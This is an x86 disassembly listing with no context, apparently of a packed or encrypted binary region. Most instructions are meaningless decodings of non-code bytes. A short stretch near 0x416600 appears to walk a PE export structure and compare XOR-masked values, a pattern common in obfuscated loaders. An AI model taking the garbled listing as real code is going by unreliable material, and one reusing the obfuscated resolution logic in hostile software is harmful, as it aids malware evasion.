  4160cd:	add    DWORD PTR [ebx+ebp*2-0x3c31fa36],0x31
  4160d5:	sub    eax,0xd9468040
  4160da:	pop    ebp
  4160db:	leave  
  4160dc:	add    al,0x4b
  4160de:	scas   al,BYTE PTR es:[edi]
  4160df:	cmp    bl,cl
  4160e1:	mov    WORD PTR [eax-0x2e],ds
  4160e4:	jp     0x41609c
  4160e6:	in     al,dx
  4160e7:	fidivr WORD PTR [esi+0x6d]
  4160ea:	dec    eax
  4160eb:	add    BYTE PTR [ebx],ah
  4160ed:	push   eax
  4160ee:	sub    al,0xd
  4160f0:	arpl   si,di
  4160f2:	imul   ebx,DWORD PTR [edi-0x70],0x66765a67
  4160f9:	test   al,0x3
  4160fb:	cdq    
  4160fc:	push   esi
  4160fd:	hlt    
  4160fe:	cld    
  4160ff:	ins    DWORD PTR es:[edi],dx
  416100:	cmp    eax,0xa9428a64
  416105:	fdiv   st(3),st
  416107:	cs (bad) 
  416109:	jae    0x41614a
  41610b:	es unpckhps xmm1,xmm0
  41610f:	sbb    ecx,DWORD PTR [ebx+0xb]
  416112:	ret    
  416113:	pop    esp
  416114:	inc    ecx
  416115:	js     0x4160e9
  416117:	adc    al,al
  416119:	mov    WORD PTR [ecx],es
  41611b:	test   eax,0x4935bb8b
  416120:	xor    BYTE PTR [edi],ch
  416122:	adc    DWORD PTR [esi+0x24],ecx
  416125:	lahf   
  416126:	and    ch,BYTE PTR [edx-0x43]
  416129:	cmp    ah,0xf5
  41612c:	stos   DWORD PTR es:[edi],eax
  41612d:	pop    es
  41612e:	inc    ecx
  41612f:	imul   esi,DWORD PTR [eax-0x1],0xf39428e0
  416136:	das    
  416137:	into   
  416138:	(bad)  
  416139:	stc    
  41613a:	push   es
  41613b:	push   esp
  41613c:	fstp   TBYTE PTR [edi]
  41613e:	mov    ch,0xd5
  416140:	sbb    BYTE PTR [edx-0x3e215e84],dl
  416146:	sbb    dl,cl
  416148:	js     0x416171
  41614a:	cmp    dh,bl
  41614c:	lods   eax,DWORD PTR ds:[esi]
  41614d:	adc    cl,BYTE PTR [esi-0x49]
  416150:	sbb    al,0x74
  416152:	aaa    
  416153:	in     eax,0x7c
  416155:	push   0x8e1aa5b6
  41615a:	jmp    0xeb2f:0x4f42e725
  416161:	sbb    eax,0xea438b8a
  416166:	jbe    0x416185
  416168:	in     al,dx
  416169:	sub    DWORD PTR [edx],esi
  41616b:	and    al,0xa3
  41616d:	ja     0x416121
  41616f:	mov    esi,0xdee42dd2
  416174:	or     BYTE PTR [esi+0x8f947d8],dh
  41617a:	(bad)  
  41617b:	les    edi,FWORD PTR [esi-0x21]
  41617e:	mov    edx,0xa1b602b5
  416183:	mov    bh,0x65
  416185:	pop    ecx
  416186:	dec    ebx
  416187:	mov    bl,0xc9
  416189:	repz pop es
  41618b:	adc    BYTE PTR [edi-0x20ea720c],dh
  416191:	xlat   BYTE PTR ds:[ebx]
  416192:	mov    cl,0x45
  416194:	ror    eax,1
  416196:	es test eax,0x3e354ae2
  41619c:	mov    bh,0x3e
  41619e:	rcl    BYTE PTR [ecx+0xd20bb6b],cl
  4161a4:	and    edi,edx
  4161a6:	dec    ebx
  4161a7:	in     eax,dx
  4161a8:	(bad)  
  4161a9:	cmp    bl,ah
  4161ab:	ror    DWORD PTR [edx+edx*4+0x1ee71474],0x5a
  4161b3:	test   BYTE PTR [esp+edx*4+0x5ceec5a3],dl
  4161ba:	fmul   st,st(4)
  4161bc:	test   eax,0xa74af057
  4161c1:	sbb    al,cl
  4161c3:	pop    ds
  4161c4:	and    BYTE PTR [ebx],bl
  4161c6:	lods   al,BYTE PTR ds:[esi]
  4161c8:	jnp    0x4161be
  4161ca:	push   ecx
  4161cb:	inc    ebp
  4161cc:	lds    ebx,FWORD PTR [ebx+0x118a3651]
  4161d2:	(bad)  
  4161d3:	sub    al,0x4c
  4161d5:	in     al,dx
  4161d6:	in     al,dx
  4161d7:	sbb    edx,0x5e
  4161da:	repnz popa 
  4161dc:	xor    cl,BYTE PTR [eax]
  4161de:	add    esi,eax
  4161e0:	mov    ebx,0xf5f05b1c
  4161e5:	icebp  
  4161e6:	jp     0x4161f9
  4161e8:	and    ebx,DWORD PTR [eax+0x34]
  4161eb:	push   cs
  4161ec:	shr    DWORD PTR [edi],1
  4161ee:	sbb    BYTE PTR [edi+0x54],0xd0
  4161f2:	imul   eax,DWORD PTR [ebx-0x29152a9d],0x6f
  4161f9:	cmp    esp,DWORD PTR [ebx]
  4161fb:	retf   0xb6bd
  4161fe:	in     al,0xa7
  416200:	aam    0x69
  416202:	ins    DWORD PTR es:[edi],dx
  416203:	or     BYTE PTR [eax+0x14],ch
  416206:	lahf   
  416207:	xor    DWORD PTR [ecx],eax
  416209:	dec    edi
  41620a:	inc    ecx
  41620b:	xchg   edi,eax
  41620c:	call   0xee63d35d
  416211:	mov    al,ds:0x6c097d33
  416216:	ins    BYTE PTR es:[edi],dx
  416217:	cmp    esi,DWORD PTR [esi]
  416219:	dec    edx
  41621a:	ds push eax
  41621c:	mov    ebx,ebp
  41621e:	inc    edi
  41621f:	sbb    eax,0xb5d625aa
  416224:	or     cl,BYTE PTR [esp+edx*8+0x5ce3ef86]
  41622b:	shl    ecx,cl
  41622d:	into   
  41622e:	inc    ecx
  41622f:	dec    esi
  416230:	add    DWORD PTR [esi],edi
  416232:	push   es
  416233:	out    dx,eax
  416234:	pop    es
  416235:	popa   
  416236:	push   0xe0972c2a
  41623b:	mov    esp,0x43a7ab97
  416240:	aam    0x43
  416242:	inc    ecx
  416243:	in     al,0x0
  416245:	(bad)  
  416246:	popf   
  416247:	out    dx,eax
  416248:	mov    eax,0xf968ccd3
  41624d:	fucomip st,st(7)
  41624f:	mov    al,ds:0xb4f1ba8
  416254:	jmp    FWORD PTR [esi-0x44177806]
  41625a:	push   0x22
  41625c:	std    
  41625d:	jecxz  0x4162b7
  41625f:	jle    0x4162ad
  416261:	or     bh,al
  416263:	adc    DWORD PTR [edx+0x65],edi
  416266:	push   0x5976c9d4
  41626b:	push   0xa84cb45d
  416270:	sub    bl,cl
  416272:	(bad)  
  416273:	mov    ebx,0x86709826
  416278:	cld    
  416279:	(bad)  
  41627a:	call   0xa87cc4b7
  41627f:	xchg   BYTE PTR [edx+ecx*4+0x59],dh
  416283:	jg     0x4162b2
  416285:	pop    ebx
  416286:	std    
  416287:	mov    ebp,0x13986da4
  41628c:	stc    
  41628d:	mov    esi,0x52ff57
  416292:	cs mov bl,0x47
  416295:	(bad)  
  416296:	mov    edx,0xa659fefb
  41629b:	shl    DWORD PTR [ecx-0x89c71ee],1
  4162a1:	cmp    BYTE PTR [edx],0xd6
  4162a4:	pusha  
  4162a5:	push   eax
  4162a6:	push   ebx
  4162a7:	popa   
  4162a8:	test   cl,cl
  4162aa:	pop    eax
  4162ab:	imul   esi,DWORD PTR [ebx+0x3a],0x5c09026e
  4162b2:	das    
  4162b3:	xchg   esi,eax
  4162b4:	xor    al,0x1
  4162b6:	mov    ds:0xdd968c19,al
  4162bb:	mov    ?,WORD PTR [ecx]
  4162bd:	adc    eax,0x1c00e1dd
  4162c2:	push   edi
  4162c3:	xlat   BYTE PTR ds:[ebx]
  4162c4:	jnp    0x416250
  4162c6:	out    0xe,al
  4162c8:	popa   
  4162c9:	cmp    dl,BYTE PTR [edx]
  4162cb:	cdq    
  4162cc:	into   
  4162cd:	rcl    DWORD PTR [edx+0x5a2d1fb3],cl
  4162d3:	adc    eax,0x579e83fb
  4162d8:	stos   DWORD PTR es:[edi],eax
  4162d9:	in     eax,dx
  4162da:	jo     0x4162de
  4162dc:	fwait
  4162dd:	(bad)  
  4162df:	add    ebp,0x9a8f3bda
  4162e5:	movlhps xmm1,xmm2
  4162e8:	lds    ebp,FWORD PTR [ecx+0x7be1f5e6]
  4162ee:	sub    al,0x5f
  4162f0:	jae    0x416303
  4162f2:	pop    eax
  4162f3:	leave  
  4162f4:	aam    0xc8
  4162f6:	and    DWORD PTR [edi+edi*1+0x7],edx
  4162fa:	pop    edx
  4162fb:	jb     0x4162bb
  4162fd:	push   ss
  4162fe:	test   BYTE PTR [edi],bl
  416300:	stos   DWORD PTR es:[edi],eax
  416301:	lahf   
  416302:	sub    DWORD PTR [ebx-0x29],ecx
  416305:	int    0xd
  416307:	int3   
  416308:	scas   eax,DWORD PTR es:[edi]
  416309:	pop    ds
  41630a:	seta   BYTE PTR [ecx-0x6cb94a32]
  416311:	jnp    0x41634d
  416313:	iret   
  416314:	rcr    DWORD PTR [edx+0x63f44028],0xa1
  41631b:	xchg   ecx,eax
  41631c:	mov    ds:0xd88adfec,eax
  416321:	fdivrp st(7),st
  416323:	inc    ebx
  416324:	jp     0x416397
  416326:	imul   ecx,DWORD PTR [ebx-0x7733d05d],0x0
  41632d:	push   ebx
  41632e:	icebp  
  41632f:	inc    edi
  416330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416331:	fbld   TBYTE PTR [edx+eax*1]
  416334:	ins    DWORD PTR es:[edi],dx
  416335:	cmp    al,bl
  416337:	popf   
  416338:	xchg   esp,eax
  416339:	dec    ecx
  41633a:	jecxz  0x416363
  41633c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41633d:	sub    eax,ebp
  41633f:	cmp    bh,BYTE PTR [ebp+0x4]
  416342:	test   BYTE PTR [edi],ch
  416344:	mov    dh,BYTE PTR [eax+0x47]
  416347:	mov    esi,0x87772f0e
  41634c:	(bad)  
  41634d:	jecxz  0x4163aa
  41634f:	or     BYTE PTR [edx+0x67],bl
  416352:	dec    ebp
  416353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416354:	pushf  
  416355:	adc    eax,0xe271a186
  41635a:	addr16 pop edx
  41635c:	(bad)  
  41635e:	mov    eax,0xae926c68
  416363:	dec    eax
  416364:	stos   BYTE PTR es:[edi],al
  416365:	pop    ds
  416366:	push   edx
  416367:	arpl   WORD PTR [eax-0x1a239109],bp
  41636d:	xchg   DWORD PTR [eax],esi
  41636f:	cdq    
  416370:	xchg   ebp,eax
  416371:	jmp    0x4163b3
  416373:	sbb    al,0x7d
  416375:	fsub   st,st(5)
  416377:	dec    esi
  416378:	xor    BYTE PTR [esp+ebp*8+0xd],0x8e
  41637d:	inc    ebx
  41637e:	cmp    edi,DWORD PTR [edx-0x23e1049]
  416384:	sbb    BYTE PTR fs:[edx+edx*1],bh
  416388:	(bad)  
  416389:	pop    ds
  41638a:	les    esi,FWORD PTR [esi-0x64]
  41638d:	retf   
  41638e:	data16 arpl WORD PTR [eax+0x66e18852],bx
  416395:	inc    eax
  416396:	jmp    0x41640a
  416398:	xchg   esp,eax
  416399:	and    edx,DWORD PTR [edi-0x54983b67]
  41639f:	ds sub eax,0x438d0f62
  4163a5:	rcr    BYTE PTR [eax-0x6b497ecf],cl
  4163ab:	cs or  cl,ah
  4163ae:	loopne 0x41635a
  4163b0:	cs dec edx
  4163b2:	push   ecx
  4163b3:	mov    al,0x72
  4163b5:	adc    eax,esi
  4163b7:	xor    DWORD PTR [edi-0x4cb01578],ebp
  4163bd:	(bad)  
  4163be:	add    BYTE PTR [edi],bl
  4163c0:	int3   
  4163c1:	sbb    ah,BYTE PTR [ebx-0x52]
  4163c4:	sbb    al,0x56
  4163c6:	stos   BYTE PTR es:[edi],al
  4163c7:	push   ecx
  4163c8:	ins    BYTE PTR es:[edi],dx
  4163c9:	loopne 0x416440
  4163cb:	xrelease xchg BYTE PTR [ecx+0x11559c5f],bh
  4163d2:	dec    ebp
  4163d3:	repnz mov ds:0x680443ec,al
  4163d9:	xor    eax,0xa357f6b9
  4163de:	or     al,BYTE PTR [esp+esi*1+0x782ec7f5]
  4163e5:	leave  
  4163e6:	loopne 0x41638a
  4163e8:	and    al,0xe0
  4163ea:	int    0x16
  4163ec:	adc    al,0x26
  4163ee:	mov    ch,0x86
  4163f0:	repz pop ss
  4163f2:	out    dx,al
  4163f3:	xchg   edi,eax
  4163f4:	ja     0x41645b
  4163f6:	aas    
  4163f7:	nop
  4163f8:	xchg   ebx,eax
  4163f9:	dec    esp
  4163fa:	push   ss
  4163fb:	xchg   ecx,eax
  4163fc:	pushf  
  4163fd:	mov    eax,ds:0xc988fc27
  416402:	push   ecx
  416403:	sbb    bh,BYTE PTR [ecx]
  416405:	sbb    al,0x7c
  416407:	sbb    ebp,DWORD PTR [ebx]
  416409:	xchg   esi,eax
  41640a:	ret    
  41640b:	lea    edi,[ecx-0x7684d3ed]
  416411:	and    dl,BYTE PTR [ecx]
  416413:	dec    eax
  416414:	cwde   
  416415:	pop    ecx
  416416:	xor    BYTE PTR [ebx+ebp*2+0x55d1a659],dl
  41641d:	loop   0x416440
  41641f:	pop    edi
  416420:	(bad)
  416424:	jmp    0x41643d
  416426:	arpl   WORD PTR [esi+0x17],si
  416429:	(bad)  [edx+edx*1]
  41642c:	iret   
  41642d:	ss push 0xffffffe4
  416430:	mov    ebp,0x72c949
  416435:	push   edx
  416436:	pusha  
  416437:	add    ebp,DWORD PTR [esi-0x55965c6f]
  41643d:	lds    ebp,FWORD PTR [esi]
  41643f:	outs   dx,BYTE PTR ds:[esi]
  416440:	imul   ebp,DWORD PTR [esp+ecx*2+0x31],0x19
  416445:	sub    al,0x43
  416447:	and    esp,DWORD PTR [edx-0x798e9b6]
  41644d:	ret    0xae15
  416450:	aam    0x93
  416452:	pop    eax
  416453:	dec    ebp
  416454:	and    edi,eax
  416456:	dec    ebp
  416457:	and    esp,DWORD PTR [ebx+ebx*4+0x16]
  41645b:	pop    es
  41645c:	jo     0x41648b
  41645e:	lock repnz pop edi
  416461:	xchg   BYTE PTR [edi],dh
  416463:	pop    esi
  416464:	sbb    al,0x53
  416466:	xchg   esi,eax
  416467:	jne    0x4164cd
  416469:	int3   
  41646a:	(bad)  [edi]
  41646c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41646d:	call   0x9da7c51
  416472:	xchg   esp,esp
  416474:	xor    eax,0xe0adc11f
  416479:	inc    edi
  41647a:	sub    BYTE PTR [ebx+0xd9f59bd],cl
  416480:	cmp    edi,0x3ef1e631
  416486:	and    eax,DWORD PTR [edi-0xb800864]
  41648c:	dec    edi
  41648d:	cmp    ecx,DWORD PTR [ebp+0x387b7bf5]
  416493:	cmp    eax,0x1b92a167
  416498:	xchg   eax,edi
  41649a:	dec    ebx
  41649b:	add    cl,BYTE PTR [edi+0x53320edc]
  4164a1:	(bad)  
  4164a2:	and    eax,0x3321b35
  4164a7:	inc    ecx
  4164a8:	or     DWORD PTR [ebp-0xf],edx
  4164ab:	sub    eax,DWORD PTR [ebx+eax*4]
  4164ae:	sbb    al,0x1
  4164b0:	jmp    0xc4b4873d
  4164b5:	lds    esp,FWORD PTR [ecx-0x24c5caa6]
  4164bb:	fdiv   st(1),st
  4164bd:	jp     0x4164c9
  4164bf:	mov    bl,0x2d
  4164c1:	push   0x7e8be3c3
  4164c6:	in     al,0xed
  4164c8:	inc    esp
  4164c9:	loopne 0x416482
  4164cb:	and    BYTE PTR [edx+0x3cff49fc],bl
  4164d1:	fld    TBYTE PTR [edi+0x26]
  4164d4:	stc    
  4164d5:	imul   ebx,DWORD PTR [esi+0x54fbd568],0x46
  4164dc:	pop    edx
  4164dd:	push   esi
  4164de:	and    cl,BYTE PTR [ecx-0x1fc33acb]
  4164e4:	or     bh,0x54
  4164e7:	data16 xor al,0x9f
  4164ea:	(bad)  
  4164eb:	imul   ebx,DWORD PTR [edx],0x5fea28db
  4164f1:	and    eax,0xf1c4b45b
  4164f6:	(bad)  
  4164f8:	add    bl,BYTE PTR [ebx-0x730b01d1]
  4164fe:	inc    ebp
  4164ff:	push   ebp
  416500:	pop    ecx
  416501:	xor    DWORD PTR [ebp+eiz*2+0x38fe6bf8],ecx
  416508:	iret   
  416509:	add    bl,BYTE PTR [eax+0x7a6e825b]
  41650f:	call   0x2463c6a2
  416514:	call   0x7f75e935
  416519:	pop    esp
  41651a:	out    0x55,eax
  41651c:	and    DWORD PTR [edx-0x1bd61295],edi
  416522:	mov    bh,0x9a
  416524:	push   esp
  416525:	adc    eax,ecx
  416527:	(bad)  
  416528:	push   ss
  416529:	das    
  41652a:	xor    edi,eax
  41652c:	aaa    
  41652d:	adc    ecx,DWORD PTR [esi+ebp*4-0x35f8cb42]
  416534:	pop    ds
  416535:	imul   esp,ebx,0x38a79e94
  41653b:	retf   0x38ed
  41653e:	mov    eax,0x2e399f
  416543:	imul   edx,DWORD PTR [edx-0x3648b209],0x1d
  41654a:	and    al,0x9e
  41654c:	and    BYTE PTR [ebp-0x34],ch
  41654f:	in     eax,0x61
  416551:	bound  ebx,QWORD PTR [esi]
  416553:	xlat   BYTE PTR ds:[ebx]
  416554:	or     eax,0x9fe87832
  416559:	inc    edi
  41655a:	in     al,0xfa
  41655c:	jmp    DWORD PTR [ebx+0x33]
  41655f:	add    edi,DWORD PTR [ebx-0x62538d26]
  416565:	(bad)  
  416566:	in     eax,dx
  416567:	(bad)  
  416568:	push   edi
  41656a:	aaa    
  41656b:	lea    ebx,[eax]
  41656d:	and    dh,BYTE PTR [esi+ebx*4+0xe]
  416571:	or     DWORD PTR [esi+edx*4+0x3301acf8],ebp
  416578:	inc    edx
  416579:	mov    ecx,0x2d5a9c92
  41657e:	inc    eax
  41657f:	outs   dx,DWORD PTR ds:[esi]
  416580:	xor    edx,ebx
  416582:	xchg   DWORD PTR [eax+0x40285205],ebp
  416588:	sub    bl,BYTE PTR [edx-0x80]
  41658b:	jmp    0xc460:0x5e15d1e2
  416592:	addr16 jle 0x41656c
  416595:	in     al,dx
  416596:	aas    
  416597:	out    dx,al
  416598:	adc    BYTE PTR [ecx-0x4b],ah
  41659b:	mov    ah,0x69
  41659d:	leave  
  41659e:	mov    ebx,0x53bac1d0
  4165a3:	sub    BYTE PTR [ecx],dh
  4165a5:	inc    esp
  4165a6:	xchg   DWORD PTR [ecx+0x63ac85f6],ebx
  4165ac:	mov    ch,0xdc
  4165ae:	adc    esp,DWORD PTR [ebx-0x5e471381]
  4165b4:	dec    ecx
  4165b5:	adc    ebp,DWORD PTR [esi]
  4165b7:	xor    ecx,edi
  4165b9:	(bad)  
  4165ba:	push   ebx
  4165bb:	sbb    ebp,DWORD PTR [ecx-0x23cee653]
  4165c1:	in     al,dx
  4165c2:	xlat   BYTE PTR ds:[ebx]
  4165c3:	aad    0x21
  4165c5:	mov    ds:0x97d2112,al
  4165ca:	jno    0x4165e7
  4165cc:	hlt    
  4165cd:	scas   al,BYTE PTR es:[edi]
  4165ce:	pextrw eax,mm1,0xa3
  4165d2:	shr    BYTE PTR [edx],1
  4165d4:	repnz adc DWORD PTR [ebx],ebx
  4165d7:	iret   
  4165d8:	fiadd  WORD PTR [ebx]
  4165da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165db:	pop    esi
  4165dc:	sbb    al,bl
  4165de:	cs xchg edi,eax
  4165e0:	and    dh,dl
  4165e2:	push   ss
  4165e3:	gs pop esp
  4165e5:	popa   
  4165e6:	retf   0x26ac
  4165e9:	sub    DWORD PTR [ecx],edi
  4165eb:	out    0x29,al
  4165ed:	mov    al,ds:0x6373f769
  4165f2:	jmp    0x4165a6
  4165f4:	sti    
  4165f5:	add    ebx,DWORD PTR [edi+0x68]
  4165f8:	les    esi,FWORD PTR [ebx+0x22850f]
  4165fe:	add    BYTE PTR [eax],al
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    cl,BYTE PTR [edi+esi*1]
  416674:	and    eax,0x6123db64
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	jl     0x4166fa
  416680:	mov    dh,0xb5
  416682:	ror    ch,0x83
  416685:	pushf  
  416686:	pop    ebp
  416687:	icebp  
  416688:	popf   
  416689:	daa    
  41668a:	push   0xf19e4c33
  41668f:	pop    ebx
  416690:	call   0xebc:0x510c1285
  416697:	pop    ebx
  416698:	fdivr  DWORD PTR [edi-0x71]
  41669b:	dec    esi
  41669c:	imul   dh
  41669e:	inc    ebx
  41669f:	mov    DWORD PTR [esp+eiz*8-0x5d],esi
  4166a3:	push   esi
  4166a4:	xchg   ecx,eax
  4166a5:	ins    BYTE PTR es:[edi],dx
  4166a6:	repnz and BYTE PTR [ebx],0x93
  4166aa:	or     esi,DWORD PTR [esi-0x73]
  4166ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ae:	push   edx
  4166af:	bound  esp,QWORD PTR [edi-0x11c1478a]
  4166b5:	pop    ss
  4166b6:	call   0xb2158d55
  4166bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166bc:	mov    ch,0x83
  4166be:	into   
  4166bf:	mul    BYTE PTR [edx]
  4166c1:	cmp    al,0x12
  4166c3:	clc    
  4166c4:	(bad)  
  4166c5:	(bad)  
  4166c6:	sbb    ebx,0xfe33fa6b
  4166cc:	stos   BYTE PTR es:[edi],al
  4166cd:	or     edx,esp
  4166cf:	jns    0x4166a5
  4166d1:	stos   DWORD PTR es:[edi],eax
  4166d2:	dec    ebx
  4166d3:	adc    bh,ch
  4166d5:	push   esp
  4166d6:	mov    esp,0xb5757a09
  4166db:	sti    
  4166dc:	loope  0x41674f
  4166de:	lods   al,BYTE PTR ds:[esi]
  4166df:	mov    ds:0x416a8563,eax
  4166e4:	sub    ch,BYTE PTR [ecx]
  4166e6:	hlt    
  4166e7:	dec    esp
  4166e8:	or     DWORD PTR [ecx],esp
  4166ea:	les    ebp,FWORD PTR [edi+esi*8+0x5c8ef185]
  4166f1:	jb     0x416699
  4166f3:	pop    esi
  4166f4:	aad    0x60
  4166f6:	xchg   edi,eax
  4166f7:	jae    0x416724
  4166f9:	rol    BYTE PTR [ecx],cl
  4166fb:	mov    es,WORD PTR [eax]
  4166fd:	jle    0x41668d
  4166ff:	add    bl,bh
  416701:	loopne 0x4166e0
  416703:	push   edx
  416704:	in     eax,0xc2
  416706:	lds    esi,FWORD PTR [esi+0x790a4bb1]
  41670c:	sar    DWORD PTR [edi-0x42611753],1
  416712:	push   0xa7c0ffe4
  416717:	add    eax,0xf7453cc4
  41671c:	jb     0x4166ef
  41671e:	(bad)  
  41671f:	xor    BYTE PTR [ecx],cl
  416721:	fiadd  WORD PTR [ecx]
  416723:	xor    eax,0xc65c93ff
  416728:	mov    esp,0x54e3f29c
  41672d:	loope  0x4166b8
  41672f:	and    ah,BYTE PTR [edi+edi*8-0x3bbce6f]
  416736:	(bad)  
  416737:	mov    eax,ds:0x29f5d435
  41673c:	mov    al,BYTE PTR [ecx]
  41673e:	jmp    0x416717
  416740:	ja     0x4166c3
  416742:	das    
  416743:	mov    ds:0x31c93468,al
  416748:	add    esi,0x3a
  41674b:	and    BYTE PTR [esi-0x77ba4fc3],cl
  416751:	pop    ds
  416752:	scas   eax,DWORD PTR es:[edi]
  416753:	fwait
  416754:	jmp    0x64ee24bc
  416759:	fldcw  WORD PTR [esi-0x15]
  41675c:	ret    
  41675d:	out    0x7c,al
  41675f:	repz jbe 0x416701
  416762:	cmc    
  416763:	sbb    DWORD PTR [ebx],edx
  416765:	push   esp
  416766:	fcmovnu st,st(7)
  416768:	fdivr  QWORD PTR ss:0xefcfc353
  41676f:	mov    ecx,0x17deb980
  416774:	in     eax,dx
  416775:	jbe    0x41673e
  416777:	sbb    al,0x6d
  416779:	pop    esp
  41677a:	mov    dh,0x27
  41677c:	call   0x2a07af0d
  416781:	jg     0x416731
  416783:	mov    cl,0x70
  416785:	call   0x96f1289e
  41678a:	stos   BYTE PTR es:[edi],al
  41678b:	loop   0x416799
  41678d:	std    
  41678e:	popa   
  41678f:	rol    DWORD PTR [esi-0x34],1
  416792:	sbb    DWORD PTR [esi+edx*2-0x3ddea1bf],ecx
  416799:	nop
  41679a:	dec    esi
  41679b:	stc    
  41679c:	mov    eax,0x56c7bf50
  4167a1:	push   ebp
  4167a2:	jne    0x4167d7
  4167a4:	out    dx,al
  4167a5:	xchg   ebp,eax
  4167a6:	in     al,0xf5
  4167a8:	or     DWORD PTR [ebx],esp
  4167aa:	bound  eax,QWORD PTR [esi-0x57d8bda7]
  4167b0:	gs mov ebx,0x39926ad8
  4167b6:	int    0x84
  4167b8:	or     esp,ecx
  4167ba:	pop    edi
  4167bb:	pop    ebx
  4167bc:	fadd   QWORD PTR [eax-0x51]
  4167bf:	mov    ?,WORD PTR [edx+ecx*8+0x61]
  4167c3:	cmp    DWORD PTR [ebx+edx*2+0x68],ebp
  4167c7:	dec    ebx
  4167c8:	rol    DWORD PTR [ebx+0x4e2a6e8c],0x86
  4167cf:	pop    ss
  4167d0:	arpl   WORD PTR [ecx+edi*8+0x6b],ax
  4167d4:	push   ss
  4167d5:	ja     0x416808
  4167d7:	dec    esi
  4167d8:	lock aas 
  4167da:	and    BYTE PTR [edi+0x663e8a7b],bl
  4167e0:	cmp    al,0x98
  4167e2:	sbb    BYTE PTR [eax+0x73],dh
  4167e5:	adc    eax,0x6d521770
  4167ea:	mov    ds:0x56994594,al
  4167ef:	(bad)  
  4167f0:	arpl   WORD PTR [edx-0xa28395f],dx
  4167f6:	push   cs
  4167f7:	fcmovbe st,st(6)
  4167f9:	mov    DWORD PTR [edx-0x3a79208d],edi
  4167ff:	xor    eax,DWORD PTR [edx]
  416801:	pop    ebx
  416802:	aas    
  416803:	add    dh,bh
  416805:	sub    BYTE PTR [edi*8-0x770a0d05],bh
  41680c:	pand   mm4,QWORD PTR [ecx-0x23bffbe0]
  416813:	int3   
  416814:	push   edx
  416815:	push   edx
  416816:	add    al,0xe4
  416818:	or     edx,ebx
  41681a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681b:	pop    esi
  41681c:	into   
  41681d:	fdiv   QWORD PTR [edi-0xf]
  416820:	jbe    0x416827
  416822:	pop    ds
  416823:	loopne 0x416889
  416825:	xor    DWORD PTR [edi],ebx
  416827:	xchg   DWORD PTR [ebx-0x52],ebp
  41682a:	adc    bl,ah
  41682c:	add    al,0xd1
  41682e:	ins    BYTE PTR es:[edi],dx
  41682f:	pop    es
  416830:	mov    BYTE PTR [ebp-0x29],al
  416833:	jne    0x4167cd
  416835:	pop    ebx
  416836:	icebp  
  416837:	cwde   
  416838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416839:	jnp    0x41686e
  41683b:	xchg   esp,eax
  41683c:	jae    0x416838
  41683e:	push   cs
  41683f:	ins    BYTE PTR es:[edi],dx
  416840:	lea    ecx,[edx]
  416842:	xchg   ebp,eax
  416843:	fst    DWORD PTR [edx-0x2d]
  416846:	jo     0x41689e
  416848:	ds jge 0x41681a
  41684b:	cli    
  41684c:	ja     0x4167d5
  41684e:	pop    ebx
  41684f:	pop    ss
  416850:	push   eax
  416851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416852:	mov    dh,BYTE PTR [ecx+0x44]
  416855:	sbb    ch,BYTE PTR [ebp-0x1050a0f2]
  41685b:	fsub   QWORD PTR fs:0xd7a68f07
  416862:	in     eax,dx
  416863:	(bad)  
  416864:	lock push edx
  416866:	cdq    
  416867:	mov    ecx,0x895eef25
  41686c:	add    eax,0x44ac72b
  416871:	mov    edi,0x1972e1dd
  416876:	pusha  
  416877:	lea    edi,[edi+ebx*8]
  41687a:	ins    DWORD PTR es:[edi],dx
  41687b:	mov    al,0x3c
  41687d:	inc    edi
  41687e:	loope  0x4168c4
  416880:	push   ss
  416881:	test   DWORD PTR [edx-0x31836e5c],eax
  416887:	loopne 0x41682e
  416889:	(bad)  
  41688a:	adc    DWORD PTR ds:0xa16a065e,eax
  416890:	push   eax
  416891:	cmp    BYTE PTR [edi+0xf4a9e40],bl
  416897:	out    0xf3,eax
  416899:	ins    BYTE PTR es:[edi],dx
  41689a:	(bad)  
  41689b:	dec    edi
  41689c:	push   DWORD PTR [ecx+0x3b89d07a]
  4168a2:	mov    ecx,0x367b5741
  4168a7:	loopne 0x4168ef
  4168a9:	adc    eax,0xdb3ee3d3
  4168ae:	inc    ebx
  4168af:	data16 mov ah,0xe0
  4168b2:	daa    
  4168b3:	(bad)  
  4168b4:	and    ebx,edx
  4168b6:	mov    ebp,0x2f745c5c
  4168bb:	(bad)  
  4168bd:	dec    esp
  4168be:	jne    0x416896
  4168c0:	ds pop edi
  4168c2:	pop    edi
  4168c3:	and    eax,0x632ea96
  4168c8:	pop    esi
  4168c9:	push   edi
